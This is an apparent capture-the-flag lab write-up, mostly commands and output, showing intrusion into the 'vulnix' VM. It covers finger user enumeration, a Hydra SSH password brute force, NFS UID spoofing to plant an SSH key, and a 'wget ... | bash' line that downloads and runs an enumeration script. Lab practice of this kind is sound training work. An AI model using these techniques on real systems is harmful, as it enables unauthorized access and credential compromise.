# vulnix

| Proto | port    | Service/URL| Info  | Potential Vulns | Verified Vulns |
|-------|---------|-------------------------------------|------------------------------------------|-----------------|----------------|

## where you at

```
root@kali:~/Documents/vulnix# nmap -sn -PR 192.168.88.128/24 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:35 CET
Nmap scan report for 192.168.88.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.134
Host is up (0.00099s latency).
MAC Address: 00:0C:29:76:09:06 (VMware)
Nmap scan report for 192.168.88.254
Host is up (0.00062s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.11 seconds
```

192.168.88.134

## what you got

### TCP
```
root@kali:~/Documents/vulnix# nmap -p- -A 192.168.88.134 -oA tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:39 CET
Scan Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 192.168.88.134   
Host is up (0.00061s latency).   
Not shown: 65518 closed ports    
PORT STATE SERVICE    VERSION    
22/tcp    open  ssh   OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)   
| ssh-hostkey:    
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA) 
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA) 
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp  Postfix smtpd   
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,    
|_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time.  
79/tcp    open  fingerLinux fingerd   
|_finger: No one logged on.\x0D  
110/tcp   open  pop3  Dovecot pop3d   
|_pop3-capabilities: SASL STLS CAPA RESP-CODES UIDL TOP PIPELINING  
|_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time.  
111/tcp   open  rpcbind    2-4 (RPC #100000)    
| rpcinfo:   
|   program version    port/proto  service 
|   100000  2,3,4   111/tcp   rpcbind 
|   100000  2,3,4   111/udp   rpcbind 
|   100000  3,4111/tcp6  rpcbind 
|   100000  3,4111/udp6  rpcbind 
|   100003  2,3,4  2049/tcp   nfs
|   100003  2,3,4  2049/tcp6  nfs
|   100003  2,3,4  2049/udp   nfs
|   100003  2,3,4  2049/udp6  nfs
|   100005  1,2,3 40412/udp   mountd  
|   100005  1,2,3 51233/tcp6  mountd  
|   100005  1,2,3 57722/tcp   mountd  
|   100005  1,2,3 59004/udp6  mountd  
|   100021  1,3,4 37539/tcp6  nlockmgr
|   100021  1,3,4 42654/udp   nlockmgr
|   100021  1,3,4 49656/udp6  nlockmgr
|   100021  1,3,4 54775/tcp   nlockmgr
|   100024  138568/tcp   status  
|   100024  150138/udp   status  
|   100024  154698/udp6  status  
|   100024  157281/tcp6  status  
|   100227  2,3    2049/tcp   nfs_acl 
|   100227  2,3    2049/tcp6  nfs_acl 
|   100227  2,3    2049/udp   nfs_acl 
|_  100227  2,3    2049/udp6  nfs_acl 
143/tcp   open  imap  Dovecot imapd   
|_imap-capabilities: ID LOGIN-REFERRALS listed STARTTLS LOGINDISABLEDA0001 IDLE ENABLE have post-login OK capabilities SASL
-IR Pre-login LITERAL+ more IMAP4rev1 
|_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time.  
512/tcp   open  exec  netkit-rsh rexecd    
513/tcp   open  login? 
514/tcp   open  tcpwrapped  
993/tcp   open  ssl/imaps?  
|_ssl-date: 2020-01-05T15:40:18+00:00; +5s from scanner time.  
995/tcp   open  ssl/pop3s?  
|_ssl-date: 2020-01-05T15:40:18+00:00; +5s from scanner time.  
2049/tcp  open  nfs_acl    2-3 (RPC #100227)    
38568/tcp open  status1 (RPC #100024) 
38839/tcp open  mountd1-3 (RPC #100005)    
54775/tcp open  nlockmgr   1-4 (RPC #100021)    
57722/tcp open  mountd1-3 (RPC #100005)    
59621/tcp open  mountd1-3 (RPC #100005)    
MAC Address: 00:0C:29:76:09:06 (VMware)    
Device type: general purpose
Running: Linux 2.6.X|3.X    
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3   
OS details: Linux 2.6.32 - 3.10  
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel   
   
Host script results:   
|_clock-skew: mean: 5s, deviation: 0s, median: 5s    
   
TRACEROUTE   
HOP RTTADDRESS    
1   0.61 ms 192.168.88.134  
   
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 213.68 seconds
```


### UDP
```
root@kali:~/Documents/vulnix# nmap -sU -A 192.168.88.134 -oA udp                            
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:37 CET
Nmap scan report for 192.168.88.134
Host is up (0.00087s latency).
Not shown: 997 closed ports
PORT     STATE         SERVICE VERSION
68/udp   open|filtered dhcpc
111/udp  open          rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40412/udp   mountd
|   100005  1,2,3      51233/tcp6  mountd
|   100005  1,2,3      57722/tcp   mountd
|   100005  1,2,3      59004/udp6  mountd
|   100021  1,3,4      37539/tcp6  nlockmgr
|   100021  1,3,4      42654/udp   nlockmgr
|   100021  1,3,4      49656/udp6  nlockmgr
|   100021  1,3,4      54775/tcp   nlockmgr
|   100024  1          38568/tcp   status
|   100024  1          50138/udp   status
|   100024  1          54698/udp6  status
|   100024  1          57281/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/udp open          nfs_acl 2-3 (RPC #100227)
MAC Address: 00:0C:29:76:09:06 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.87 ms 192.168.88.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1202.51 seconds

```


### Finger me pls

```
root@kali:~/Documents/vulnix# nc 192.168.88.134 79
root                                                    
Login: root                             Name: root      
Directory: /root                        Shell: /bin/bash
Never logged in.                                        
No mail.                                                
No Plan.                                      


root@kali:~/Documents/vulnix# nc 192.168.88.134 79       
vulnix                                                   
Login: vulnix                           Name:            
Directory: /home/vulnix                 Shell: /bin/bash 
Never logged in.                                         
No mail.                                                 
No Plan.                                                 
```

```
msf5 > search finger                                                                                                                                   
                                                                                                                                                       
Matching Modules                                                                                                                                       
================                                                                                                                                       
                                                                                                                                                       
   #  Name                                            Disclosure Date  Rank    Check  Description                                                      
   -  ----                                            ---------------  ----    -----  -----------                                                      
   0  auxiliary/gather/mybb_db_fingerprint            2014-02-13       normal  Yes    MyBB Database Fingerprint                                        
   1  auxiliary/scanner/finger/finger_users                            normal  No     Finger Service User Enumerator                                   
   2  auxiliary/scanner/oracle/isqlplus_login                          normal  No     Oracle iSQL*Plus Login Utility                                   
   3  auxiliary/scanner/oracle/isqlplus_sidbrute                       normal  No     Oracle iSQLPlus SID Check                                        
   4  auxiliary/scanner/vmware/esx_fingerprint                         normal  No     VMWare ESX/ESXi Fingerprint Scanner                              
   5  auxiliary/server/browser_autopwn                                 normal  No     HTTP Client Automatic Exploiter                                  
   6  exploit/bsd/finger/morris_fingerd_bof           1988-11-02       normal  Yes    Morris Worm fingerd Stack Buffer Overflow                        
   7  exploit/windows/http/bea_weblogic_post_bof      2008-07-17       great   Yes    Oracle Weblogic Apache Connector POST Request Buffer Overflow    
   8  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free  
   9  post/windows/gather/enum_putty_saved_sessions                    normal  No     PuTTY Saved Sessions Enumeration Module                          

msf5 > use 1                                                                                                                                                                                             
msf5 auxiliary(scanner/finger/finger_users) > show options                                                                                                                                               
                                                                                                                                                                                                         
Module options (auxiliary/scanner/finger/finger_users):                                                                                                                                                  
                                                                                                                                                                                                         
   Name        Current Setting                                                Required  Description                                                                                                      
   ----        ---------------                                                --------  -----------                                                                                                      
   RHOSTS                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                               
   RPORT       79                                                             yes       The target port (TCP)                                                                                            
   THREADS     1                                                              yes       The number of concurrent threads (max one per host)                                                              
   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of default UNIX accounts.                                                          
                                                                                                                                                                                                         
msf5 auxiliary(scanner/finger/finger_users) > set rhost 192.168.88.134                                                                                                                                   
rhost => 192.168.88.134                                                                                                                                                                                  
msf5 auxiliary(scanner/finger/finger_users) > run                                                                                                                                                        
                                                                                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: backup                                                                                                                                       
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: bin                                                                                                                                          
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: daemon                                                                                                                                       
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: games                                                                                                                                        
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: gnats                                                                                                                                        
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: irc                                                                                                                                          
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: libuuid                                                                                                                                      
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: list                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: lp                                                                                                                                           
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: mail                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: dovecot                                                                                                                                      
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: man                                                                                                                                          
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: messagebus                                                                                                                                   
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: news                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: nobody                                                                                                                                       
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: proxy                                                                                                                                        
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: root                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: sshd                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: sync                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: sys                                                                                                                                          
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: syslog                                                                                                                                       
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: user                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: dovenull                                                                                                                                     
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: uucp                                                                                                                                         
[+] 192.168.88.134:79     - 192.168.88.134:79 - Found user: www-data                                                                                                                                     
[+] 192.168.88.134:79     - 192.168.88.134:79 Users found: backup, bin, daemon, dovecot, dovenull, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, syslog, user, uucp, www-data                                                                                                                                                                          
[*] 192.168.88.134:79     - Scanned 1 of 1 hosts (100% complete)                                                                                                                                         
[*] Auxiliary module execution completed                                                                                                                                                                 
```

### user list

```
backup
bin
daemon
dovecot
dovenull
games
gnats
irc
libuuid
list
lp
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
sys
syslog
user
uucp
www-data
vulnix
```

### nfs

```
showmount -e 192.168.88.134
Export list for 192.168.88.134:
/home/vulnix *

```

## Breaking in

### Hydra

```
hydra  -L /root/Documents/vulnix/users.txt -P /usr/share/wordlists/rockyou.txt 192.168.88.134 ssh -t 8
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-05 18:22:01
[DATA] max 8 tasks per 1 server, overall 8 tasks, 28688798 login tries (l:2/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.88.134:22/
[STATUS] 88.00 tries/min, 88 tries in 00:01h, 28688710 to do in 5433:29h, 8 active
[STATUS] 66.67 tries/min, 200 tries in 00:03h, 28688598 to do in 7172:09h, 8 active
[STATUS] 58.29 tries/min, 408 tries in 00:07h, 28688390 to do in 8203:23h, 8 active
[22][ssh] host: 192.168.88.134   login: user   password: letmein
```

`user:letmein`


### nfs mount

```
root@kali:~/Documents/vulnix#  mount -nolock -t nfs 192.168.88.134:/home/vulnix /root/Documents/vulnix/mountme/
root@kali:~/Documents/vulnix# ls -la
total 150708
drwxr-xr-x 3 root   root            4096 Jan  5 18:27 .
drwxr-xr-x 5 root   root            4096 Jan  5 16:35 ..
drwxr-x--- 2 nobody 4294967294      4096 Sep  2  2012 mountme
-rw-r--r-- 1 root   root            1022 Jan  5 16:42 tcp.gnmap
-rw-r--r-- 1 root   root            3504 Jan  5 16:42 tcp.nmap
-rw-r--r-- 1 root   root           15356 Jan  5 16:42 tcp.xml
-rw-r--r-- 1 root   root               0 Jan  5 17:01 udp.gnmap
-rw-r--r-- 1 root   root               0 Jan  5 17:01 udp.nmap
-rw-r--r-- 1 root   root            5345 Jan  5 17:01 udp.xml
-rw-r--r-- 1 root   root              12 Jan  5 18:21 users.txt
root@kali:~/Documents/vulnix# umount mountme 
root@kali:~/Documents/vulnix# ls -la
total 150708
drwxr-xr-x 3 root root      4096 Jan  5 18:27 .
drwxr-xr-x 5 root root      4096 Jan  5 16:35 ..
-rw-r--r-- 1 root root 154273377 Jan  5 18:32 hydra.restore
drwxr-x--- 2 2008 2008      4096 Sep  2  2012 mountme
-rw-r--r-- 1 root root      1022 Jan  5 16:42 tcp.gnmap
-rw-r--r-- 1 root root      3504 Jan  5 16:42 tcp.nmap
-rw-r--r-- 1 root root     15356 Jan  5 16:42 tcp.xml
-rw-r--r-- 1 root root         0 Jan  5 17:01 udp.gnmap
-rw-r--r-- 1 root root         0 Jan  5 17:01 udp.nmap
-rw-r--r-- 1 root root      5345 Jan  5 17:01 udp.xml
-rw-r--r-- 1 root root        12 Jan  5 18:21 users.txt
root@kali:~/Documents/vulnix# useradd vulnix -u 2008 -d /home/vulnix
root@kali:~/Documents/vulnix# ls -lA
total 40
drwxr-x--- 2 vulnix vulnix  4096 Sep  2  2012 mountme
-rw-r--r-- 1 root   root    1022 Jan  5 16:42 tcp.gnmap
-rw-r--r-- 1 root   root    3504 Jan  5 16:42 tcp.nmap
-rw-r--r-- 1 root   root   15356 Jan  5 16:42 tcp.xml
-rw-r--r-- 1 root   root       0 Jan  5 17:01 udp.gnmap
-rw-r--r-- 1 root   root       0 Jan  5 17:01 udp.nmap
-rw-r--r-- 1 root   root    5345 Jan  5 17:01 udp.xml
-rw-r--r-- 1 root   root      12 Jan  5 18:21 users.txt
root@kali:~/Documents/vulnix# su vulnix
$ bash
vulnix@kali:/root/Documents/vulnix/mountme$ ls -lA
total 12
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
vulnix@kali:/root/Documents/vulnix/mountme$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): /tmp/key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/key.
Your public key has been saved in /tmp/key.pub.
The key fingerprint is:
SHA256:ES3pMjF0F3d/CzJhJIqQc/3J9G5ot+kBuyh9krD7alQ vulnix@kali
The key's randomart image is:
+---[RSA 3072]----+
|   ...o o++=. .  |
|   o..+o+++... . |
|    o. ==.oo .  o|
|      oE.= .o . o|
|      .oS.o    . |
|     o   oo+     |
|    . + o.o.o    |
|     + +...o.    |
|    .o=oo...     |
+----[SHA256]-----+
vulnix@kali:/root/Documents/vulnix/mountme$ mv /tmp/key.pub .
vulnix@kali:/root/Documents/vulnix/mountme$ mkdir .ssh
vulnix@kali:/root/Documents/vulnix/mountme$ vim .ssh/authorized_keys
vulnix@kali:/root/Documents/vulnix/mountme$ touch .ssh/authorized_keys
vulnix@kali:/root/Documents/vulnix/mountme$ cat key.pub >> .ssh/authorized_keys 
vulnix@kali:/root/Documents/vulnix/mountme$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHQQAHSTFt/pSBit7lLH9HvkC9t0eSOyZLm61y//Y4CJrIMQVSWDj6OtqdN/HqtoYZbDw0hahkR9Ynkf0O2y3jT09l1pVdL0R1nJoT5xe0k6fXmJc5+d10y8SdJTc9yop5MKLm4vd3XDYVMxjAnRr59nFqj7HoQJI/SHvriLLplHJrznBgTok/YSnP8+kpAbtd3bpjO2zWvQDc2XoQOCuqUDx21Yy4kiP400dWpzXTE8gQsrd0T5i7DhEZd1R7Z0fCuhTY3d7VyB7AGesyxpynsVqrzDoxoWcPLQkKeov4Cov6FB5OnzKboFHxBWVHp4W6AKzmkvtbL0gCZOou5ytR/PcIDBDZPBR0UjoZdzYeUIWfRrAQMEa+LnLAcIzGZVvLIjjx2noW/F/KmVg24GP8VOn1ixXcRRqd/32hgcVUlQbzNJSIHPboF3c5n2xqMmPtLRk3Gi6qRXdm2yobkg0HQ5xhNMgsUiA0nCfTZKajWfQ4BvL5Y9oi2EHumTzMgzM= vulnix@kali
vulnix@kali:/root/Documents/vulnix/mountme$ ssh vulnix@192.168.88.134 -i /tmp/key
Could not create directory '/home/vulnix/.ssh'.
The authenticity of host '192.168.88.134 (192.168.88.134)' can't be established.
ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/vulnix/.ssh/known_hosts).
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jan  5 17:43:36 GMT 2020

  System load:  0.0              Processes:           96
  Usage of /:   90.6% of 773MB   Users logged in:     0
  Memory usage: 4%               IP address for eth0: 192.168.88.134
  Swap usage:   0%

  => / is using 90.6% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:/$
```

### LinEnum

```
vulnix@vulnix:/$ wget -O - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash                                                                                 
--2020-01-05 17:45:25--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh                                                                                          
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.36.133                                                                                                        
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.36.133|:443... connected.                                                                                    
HTTP request sent, awaiting response... 200 OK                                                                                                                                           
Length: 46476 (45K) [text/plain]                                                                                                                                                         
Saving to: `STDOUT'                                                                                                                                                                      
                                                                                                                                                                                         
100%[===============================================================================================================================================>] 46,476      --.-K/s   in 0.008s   
                                                                                                                                                                                         
2020-01-05 17:45:25 (5.86 MB/s) - written to stdout [46476/46476]                                                                                                                        
                                                                                                                                                                                         
                                                                                                                                                                                         
#########################################################                                                                                                                                
# Local Linux Enumeration & Privilege Escalation Script #                                                                                                                                
#########################################################                                                                                                                                
# www.rebootuser.com                                                                                                                                                                     
# version 0.981                                                                                                                                                                          
                                                                                                                                                                                         
[-] Debug Info                                                                                                                                                                           
[+] Thorough tests = Disabled                                                                                                                                                            
                                                                                                                                                                                         
                                                                                                                                                                                         
Scan started at:                                                                                                                                                                         
Sun Jan  5 17:45:27 GMT 2020                                                                                                                                                             
                                                                                                                                                                                         
                                                                                                                                                                                         
### SYSTEM ##############################################                                                                                                                                
[-] Kernel information:                                                                                                                                                                  
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux                                                                                   
                                                                                                                                                                                         
                                                                                                                                                                                         
[-] Kernel information (continued):                                                                                                                                                      
Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 

[-] Specific release information:                                                                                                                                                        
DISTRIB_ID=Ubuntu                                                                                                                                                                        
DISTRIB_RELEASE=12.04                                                                                                                                                                    
DISTRIB_CODENAME=precise                                                                                                                                                                 
DISTRIB_DESCRIPTION="Ubuntu 12.04.1 LTS"


[-] Hostname:
vulnix


### USER/GROUP ##########################################
[-] Current user/group info:
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
vulnix           pts/0    192.168.88.128   Sun Jan  5 17:43:36 +0000 2020


[-] Who else is logged on:
 17:45:28 up  2:11,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
vulnix   pts/0    192.168.88.128   17:43    3.00s  0.73s  0.01s w


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
uid=103(whoopsie) gid=106(whoopsie) groups=106(whoopsie)
uid=104(postfix) gid=110(postfix) groups=110(postfix)
uid=105(dovecot) gid=112(dovecot) groups=112(dovecot)
uid=106(dovenull) gid=65534(nogroup) groups=65534(nogroup)
uid=107(landscape) gid=113(landscape) groups=113(landscape)
uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
uid=109(statd) gid=65534(nogroup) groups=65534(nogroup)

[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false 
whoopsie:x:103:106::/nonexistent:/bin/false
postfix:x:104:110::/var/spool/postfix:/bin/false
dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:107:113::/var/lib/landscape:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
statd:x:109:65534::/var/lib/nfs:/bin/false


[-] Super user account(s):
root


[+] We can sudo without supplying a password!
Matching 'Defaults' entries for vulnix on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root   root   4.0K Sep  2  2012 .
drwxr-xr-x 22 root   root   4.0K Sep  2  2012 ..
drwxr-x---  3 user   user   4.0K Sep  2  2012 user
drwxr-x---  4 vulnix vulnix 4.0K Jan  5 17:43 vulnix


[-] Root is allowed to login via SSH:
PermitRootLogin yes

### ENVIRONMENTAL #######################################
[-] Environment information:
SHELL=/bin/bash
TERM=screen
SSH_CLIENT=192.168.88.128 43142 22
SSH_TTY=/dev/pts/0
USER=vulnix
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/vulnix
PWD=/
LANG=en_GB.UTF-8
HOME=/home/vulnix
SHLVL=2
LANGUAGE=en_GB:en
LOGNAME=vulnix
SSH_CONNECTION=192.168.88.128 43142 192.168.88.134 22
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
drwxr-xr-x 2 root root  4096 Sep  2  2012 /bin 
drwxr-xr-x 2 root root  4096 Sep  2  2012 /sbin
drwxr-xr-x 2 root root 20480 Sep  2  2012 /usr/bin
drwxr-xr-x 2 root root  4096 Aug  4  2012 /usr/games
drwxr-xr-x 2 root root  4096 Sep  2  2012 /usr/local/bin
drwxr-xr-x 2 root root  4096 Sep  2  2012 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Sep  2  2012 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK           022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512
### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Sep  2  2012 .
drwxr-xr-x 91 root root  4096 Jan  5 16:33 ..
-rwxr-xr-x  1 root root   219 Apr 10  2012 apport
-rwxr-xr-x  1 root root 15399 Jun 15  2012 apt 
-rwxr-xr-x  1 root root   314 Mar 30  2012 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root   256 Apr 13  2012 dpkg
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Mar 31  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Apr  9  2012 passwd
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
-rwxr-xr-x  1 root root   214 Aug  9  2012 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
